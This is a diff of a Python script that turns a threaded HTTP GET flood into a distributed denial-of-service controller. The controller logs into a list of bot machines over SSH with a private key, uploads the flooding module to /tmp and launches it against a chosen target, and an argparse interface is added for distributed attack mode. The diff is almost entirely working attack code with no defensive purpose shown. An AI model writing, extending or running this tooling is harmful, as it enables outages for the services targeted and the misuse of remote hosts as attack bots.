@@ -1,50 +1,31 @@
-import socket
-import threading
-import random
-import psutil
 import paramiko
-from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
-from scapy.sendrecv import sendp
-
-# Functie om het maximale aantal CPU-cores te verkrijgen
-def get_max_cores():
-    max_thread_count = psutil.cpu_count(logical=True)
-    return max_thread_count
-
-# Functie die een Denial of Service (DoS) aanval uitvoert met HTTP GET-verzoeken
-def http_dos(target_host,target_port):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Een TCP-socket maken
-    sock.connect((target_host, target_port))  # Verbinding maken met het doel-IP en de poort
-    while True:
-        try:
-            # Een HTTP GET-verzoek verzenden naar het doel
-            sock.send(f"GET /index.html HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n".encode())
-        except Exception as e:
-            # Als er een fout optreedt, de aanval opnieuw starten
-            http_dos(target_host,target_port)
-
-# Functie om de DoS-functie uit te voeren met meerdere threads
-def execute_http_dos(target_host,target_port):
-    max_thread_count = get_max_cores()  # Het maximale aantal beschikbare CPU-cores verkrijgen
-    for i in range(0, max_thread_count):
-        try:
-            thread = threading.Thread(target=http_dos, args=(target_host,target_port))  # Een nieuwe thread maken voor elke aanval
-            thread.start()  # De thread starten
-            print(f"Thread {i} started (http)")  # Afdrukken dat de thread is gestart
-        except Exception as e:
-            print(f"Error: {e}")
-
-def load_target_bot_list(file):
+import argparse
+from http_bot_module import execute_http_dos
+def load_target_bot_list(list):
     bot_list = []
-    with open(file, "r") as file:
-        for line in file:
-            line=line.replace("\n", "")
-            (bot_ip,bot_port, username)=line.split(":")
-            bot_list.append((bot_ip, bot_port, username))
+    lines = list.split("\r\n")
+    for line in lines:
+        line = line.strip()
+        if not line:
+            continue
+        bot_ip, bot_port, username = line.split(":")
+        bot_list.append((bot_ip, bot_port, username))
     return bot_list
 
-### TODO: ervoor zoregndat de ddos op de bots wordt uitgevoerd
-def create_ddos(ddos_type, target_host, target_port, bot_list, pvkey="/home/nvdg/.ssh/id_rsa"):
+def check_for_python(ssh_client, bot_ip):
+    # Run the Python version command remotely
+    stdin, stdout, stderr = ssh_client.exec_command('python3 --version')
+    # Check the output to see if Python is installed
+    out = stdout.read().decode().strip()
+    err = stderr.read().decode().strip()
+    if out.startswith('Python') or err.startswith('Python'):
+        print(f"Python is installed on {bot_ip}")
+        return True
+    else:
+        print(f"Python is not installed on {bot_ip}")
+        return False
+
+def create_ddos(target_host, target_port, bot_list, pvkey, password):
     for bot_tupple in bot_list:
         bot_ip, bot_port, username = bot_tupple
 
@@ -53,25 +34,42 @@ def create_ddos(ddos_type, target_host, target_port, bot_list, pvkey="/home/nvdg
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
         # Connect to the remote host
-        private_key = paramiko.RSAKey.from_private_key_file(filename="/home/nvdg/.ssh/id_rsa",password="EMPTY" )
+        private_key = paramiko.RSAKey.from_private_key_file(filename=pvkey,password=password)
         ssh_client.connect(hostname=bot_ip, port=bot_port, username=username, pkey=private_key)
 
-        # Run the Python version command remotely
-        stdin, stdout, stderr = ssh_client.exec_command('python --version')
+        python_exsists = check_for_python(ssh_client, bot_ip)
 
-        # Check the output to see if Python is installed
-        output = stdout.read().decode().strip()
-        
-        if output.startswith('Python'):
-            print(f"Python is installed on {bot_ip}")
-        else:
-            print(f"Python is not installed on {bot_ip}")
+        if python_exsists:
+            ssh_client.exec_command('pip3 install psutil')
+            # Open an SFTP connection
+            sftp = ssh_client.open_sftp()
+            # Upload the Python script to the /tmp/ directory on the remote host
+            sftp.put("modules/dos/http_bot_module.py", "/tmp/http_bot_module.py")
+            # Close the SFTP connection
+            sftp.close()
+
+            stdin, stdout,sdterr = ssh_client.exec_command(f"python3 /tmp/http_bot_module.py {target_host} {target_port}")
+            print(target_host, target_port)
+            execute_http_dos(target_host,target_port)
 
         # Close the SSH connection
         ssh_client.close()
 
-def start_dos_script(target_host, target_port, isDistributed=False, pvkey=""):
+def start_dos_script(target_host, target_port, isDistributed=False, bot_list="", pvkey="",password=""):
+    target_port = int(target_port)
     if isDistributed:
-        create_ddos(target_host,target_port,load_target_bot_list("test.txt"), pvkey)
+        create_ddos(target_host,target_port,load_target_bot_list(bot_list), pvkey, password)
     else:
         execute_http_dos(target_host,target_port)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Distributed Denial of Service (DDoS) script.")
+    parser.add_argument("target_host", type=str, help="Target host IP address or domain.")
+    parser.add_argument("target_port", type=int, help="Target host port.")
+    parser.add_argument("--distributed", action="store_true", help="Enable distributed attack mode.")
+    parser.add_argument("--bot_list", type=str, help="List of bots in the format 'IP:Port:Username'.")
+    parser.add_argument("--private_key", type=str, help="Path to the private key file.")
+    parser.add_argument("--password", type=str, help="Password for the private key file.")
+
+    args = parser.parse_args()
+    start_dos_script(args.target_host, args.target_port, args.distributed, args.bot_list, args.private_key, args.password)
